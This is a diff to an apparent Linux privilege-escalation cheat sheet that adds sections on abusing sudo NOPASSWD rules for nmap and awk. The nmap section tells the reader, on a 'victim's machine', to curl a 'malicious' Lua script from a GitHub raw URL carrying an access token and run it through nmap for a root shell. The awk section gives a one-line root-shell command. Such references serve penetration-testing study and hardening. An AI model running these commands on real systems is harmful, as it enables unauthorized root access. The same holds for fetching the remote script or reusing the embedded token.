@@ -199,6 +199,39 @@ ALL=(root) NOPASSWD: /usr/bin/ftp
 ALL=(root) NOPASSWD: /usr/bin/man
 ```
 
- same as [/usr/bin/less]()
+ same as [/usr/bin/less](https://github.com/theamanrawat/privilege-escalation/blob/master/Linux/README.md#8-usrbinless)
+ 
+## 11. /usr/bin/nmap
+
+```
+ALL=(root) NOPASSWD: /usr/bin/nmap
+```
+ **Victim's machine**
+ 
+ - download malicious script using this command
+ 
+ ```
+ curl https://raw.githubusercontent.com/theamanrawat/privilege-escalation/master/Linux/nmap.lua?token=AISTJLQ6WEAQ3F3TNHVSR327E3FQW -o nmap.lua
+ ```
+ - pop root shell using nmap
+ ```
+ nmap 127.0.0.1 --script nmap.lua
+ ```
+ 
+## 12. /usr/bin/awk
+
+```
+ALL=(root) NOPASSWD: /usr/bin/awk
+```
+
+ **Victim's machine**
+ 
+ - run this command to pop up root shell
+ ```
+ sudo awk '{system("/bin/sh")}'
+ ```
+ 
+ 
+  
  
   
